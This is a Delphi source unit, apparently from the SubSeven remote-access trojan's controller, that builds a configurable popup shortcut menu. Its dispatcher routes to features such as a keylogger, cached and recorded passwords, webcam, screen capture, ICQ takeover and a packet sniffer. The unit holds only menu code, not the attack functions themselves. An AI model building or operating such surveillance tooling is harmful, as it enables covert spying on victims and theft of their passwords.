unit PopUpUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, OutlookBtn;

type
  TPopUp = class(TForm)
    myShape: TShape;
    bname1: TOutlookBtn;
    bname2: TOutlookBtn;
    bname3: TOutlookBtn;
    bname4: TOutlookBtn;
    bname5: TOutlookBtn;
    bname6: TOutlookBtn;
    bname7: TOutlookBtn;
    bname8: TOutlookBtn;
    bname9: TOutlookBtn;
    bname10: TOutlookBtn;
    bname11: TOutlookBtn;
    bname12: TOutlookBtn;
    procedure FormCreate(Sender: TObject);
    procedure FormDeactivate(Sender: TObject);
    procedure bname1Click(Sender: TObject);
    procedure bname2Click(Sender: TObject);
    procedure bname3Click(Sender: TObject);
    procedure bname4Click(Sender: TObject);
    procedure bname5Click(Sender: TObject);
    procedure bname6Click(Sender: TObject);
    procedure bname7Click(Sender: TObject);
    procedure bname8Click(Sender: TObject);
    procedure bname9Click(Sender: TObject);
    procedure bname10Click(Sender: TObject);
    procedure bname11Click(Sender: TObject);
    procedure bname12Click(Sender: TObject);
  private
    procedure Apasa(titlu: string);
    procedure ReadShortCutSettings;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    PopUpButtons:Integer;
    procedure PopIT(ShortCut:boolean);
    procedure SetTheColors;
  end;

var
  PopUp: TPopUp;

implementation

uses MainUnit, ShortcutUnit, AnimUnit, KeyLoggerUnit, FileMunit,
  winmUnit, iptoolUnit, procUnit;

{$R *.DFM}

const setupbtn='configure...';

procedure TPopUp.ReadShortCutSettings;
begin
 try
  bname1.caption:=MainForm.ReadKey('pu_1');
  bname2.caption:=MainForm.ReadKey('pu_2');
  bname3.caption:=MainForm.ReadKey('pu_3');
  bname4.caption:=MainForm.ReadKey('pu_4');
  bname5.caption:=MainForm.ReadKey('pu_5');
  bname6.caption:=MainForm.ReadKey('pu_6');
  bname7.caption:=MainForm.ReadKey('pu_7');
  bname8.caption:=MainForm.ReadKey('pu_8');
  bname9.caption:=MainForm.ReadKey('pu_9');
  bname10.caption:=MainForm.ReadKey('pu_10');
  bname11.caption:=MainForm.ReadKey('pu_11');
 except end;
 try PopUpButtons:=StrToInt(MainForm.ReadKey('pu_count'));except PopUpButtons:=0;end;
 if PopUpButtons<1 then begin PopUpButtons:=1;bname1.caption:='[error]';end;

 if PopUpButtons<11 then
 PopUp.Height:=256-(21*(11-PopUpButtons)) else PopUp.Height:=256;
 case PopUpButtons of
  1 :with bname2 do begin caption:=setupbtn;font.style:=[fsBold];end;
  2 :with bname3 do begin caption:=setupbtn;font.style:=[fsBold];end;
  3 :with bname4 do begin caption:=setupbtn;font.style:=[fsBold];end;
  4 :with bname5 do begin caption:=setupbtn;font.style:=[fsBold];end;
  5 :with bname6 do begin caption:=setupbtn;font.style:=[fsBold];end;
  6 :with bname7 do begin caption:=setupbtn;font.style:=[fsBold];end;
  7 :with bname8 do begin caption:=setupbtn;font.style:=[fsBold];end;
  8 :with bname9 do begin caption:=setupbtn;font.style:=[fsBold];end;
  9 :with bname10 do begin caption:=setupbtn;font.style:=[fsBold];end;
  10:with bname11 do begin caption:=setupbtn;font.style:=[fsBold];end;
  11:with bname12 do begin caption:=setupbtn;font.style:=[fsBold];end;
 end;
end;

procedure TPopUp.PopIT;
var p:TPoint;
begin
 GetCursorPos(p);
 PopUp.Left:=p.x;
  if (p.x+PopUp.Width>Screen.Width-10) then PopUp.Left:=p.x-PopUp.Width;
 PopUp.Top:=p.y;
  if (p.y+PopUp.Height>Screen.Height-10) then PopUp.Top:=p.y-PopUp.Height;
 with bname1.font do style:=style-[fsBold];with bname2.font do style:=style-[fsBold];
 with bname3.font do style:=style-[fsBold];with bname4.font do style:=style-[fsBold];
 with bname5.font do style:=style-[fsBold];with bname6.font do style:=style-[fsBold];
 with bname7.font do style:=style-[fsBold];with bname8.font do style:=style-[fsBold];
 with bname9.font do style:=style-[fsBold];with bname10.font do style:=style-[fsBold];
 with bname11.font do style:=style-[fsBold];with bname12.font do style:=style-[fsBold];
 if ShortCut then ReadShortcutSettings;
 PopUp.Show;
end;

procedure TPopUp.SetTheColors;
begin
 myShape.Brush.Color:=cFormBackground;
 myShape.Pen.Color:=cFormLine;
 Invalidate;
end;

procedure TPopUp.FormCreate(Sender: TObject);
begin
 SetTheColors;
end;

procedure TPopUp.FormDeactivate(Sender: TObject);
begin
 PopUp.Hide;
end;

procedure TPopUp.Apasa(titlu:string);
var sender:TObject;
begin
 sender:=nil;
 PopUp.Hide;
 if (titlu='[error]') then MainForm.ShowMsg('error reading shortcut menu settings. go to [misc options] and click [erase all sub7 options and start over]')
  else if (titlu=setupbtn) then ShortcutForm.Show
{  else if (titlu='ip scanner') then}
  else if (titlu='get pc info') then MainForm._Pagini.ActivePage:=MainForm.pGetMoreInfo
  else if (titlu='spy') then MainForm._Pagini.ActivePage:=MainForm.pSpy
  else if (titlu='screen saver') then MainForm._Pagini.ActivePage:=MainForm.pScreenSaver
  else if (titlu='matrix') then MainForm._Pagini.ActivePage:=MainForm.pMatrix
  else if (titlu='ip scanner') then MainForm._Pagini.ActivePage:=MainForm.pScanner
  else if (titlu='get home info') then MainForm._Pagini.ActivePage:=MainForm.pHomeInfo
  else if (titlu='server options') then MainForm._Pagini.ActivePage:=MainForm.pServerOptions
  else if (titlu='ip notify') then MainForm._Pagini.ActivePage:=MainForm.pNotify
  else if (titlu='open keylogger') then Anim.Animeaza(KeyLogger)
  else if (titlu='send keys') then MainForm._Pagini.ActivePage:=MainForm.pSendKeys
  else if (titlu='keyboard features') then MainForm._Pagini.ActivePage:=MainForm.pKeyBoard
  else if (titlu='chat') then MainForm._Pagini.ActivePage:=MainForm.pChat
  else if (titlu='ftp') then MainForm._Pagini.ActivePage:=MainForm.pFTP
  else if (titlu='find files') then MainForm._Pagini.ActivePage:=MainForm.pFindFiles
  else if (titlu='cached passwords') then MainForm.OutlookBtn33Click(Sender)
  else if (titlu='recorded passwords') then MainForm.OutlookBtn34Click(Sender)
  else if (titlu='reg edit') then MainForm.OutlookBtn37Click(Sender)
  else if (titlu='file manager') then Anim.Animeaza(fileM)
  else if (titlu='windows manager') then Anim.Animeaza(winM)
  else if (titlu='screen preview') then MainForm.OutlookBtn80Click(Sender)
  else if (titlu='screen capture') then MainForm.OutlookBtn81Click(Sender)
  else if (titlu='webcam') then MainForm.OutlookBtn82Click(Sender)
  else if (titlu='open icq spy') then MainForm.OutlookBtn79Click(Sender)
  else if (titlu='IP tool') then Anim.Animeaza(IPTool)
  else if (titlu='ICQ takeover') then MainForm._Pagini.ActivePage:=MainForm.pICQTakeover
  else if (titlu='port redirect') then MainForm._Pagini.ActivePage:=MainForm.pPortRedirect
  else if (titlu='IRC bot') then MainForm._Pagini.ActivePage:=MainForm.pIRCBot
  else if (titlu='process manager') then Anim.Animeaza(ProcM)
  else if (titlu='text-2-speech') then MainForm._Pagini.ActivePage:=MainForm.pSpeech
  else if (titlu='clipboard manager') then MainForm._Pagini.ActivePage:=MainForm.pClipboard
  else if (titlu='packet sniffer') then MainForm._Pagini.ActivePage:=MainForm.pSniff
  else if (titlu='run EditServer') then MainForm.RunEditServer
  else MainForm.ShowMsg('unknown shortcut');
end;

procedure TPopUp.bname1Click(Sender: TObject);
begin
 Apasa(bname1.Caption);
end;

procedure TPopUp.bname2Click(Sender: TObject);
begin
 Apasa(bname2.Caption);
end;

procedure TPopUp.bname3Click(Sender: TObject);
begin
 Apasa(bname3.Caption);
end;

procedure TPopUp.bname4Click(Sender: TObject);
begin
 Apasa(bname4.Caption);
end;

procedure TPopUp.bname5Click(Sender: TObject);
begin
 Apasa(bname5.Caption);
end;

procedure TPopUp.bname6Click(Sender: TObject);
begin
 Apasa(bname6.Caption);
end;

procedure TPopUp.bname7Click(Sender: TObject);
begin
 Apasa(bname7.Caption);
end;

procedure TPopUp.bname8Click(Sender: TObject);
begin
 Apasa(bname8.Caption);
end;

procedure TPopUp.bname9Click(Sender: TObject);
begin
 Apasa(bname9.Caption);
end;

procedure TPopUp.bname10Click(Sender: TObject);
begin
 Apasa(bname10.Caption);
end;

procedure TPopUp.bname11Click(Sender: TObject);
begin
 Apasa(bname11.Caption);
end;

procedure TPopUp.bname12Click(Sender: TObject);
begin
 Apasa(bname12.Caption);
end;

end.
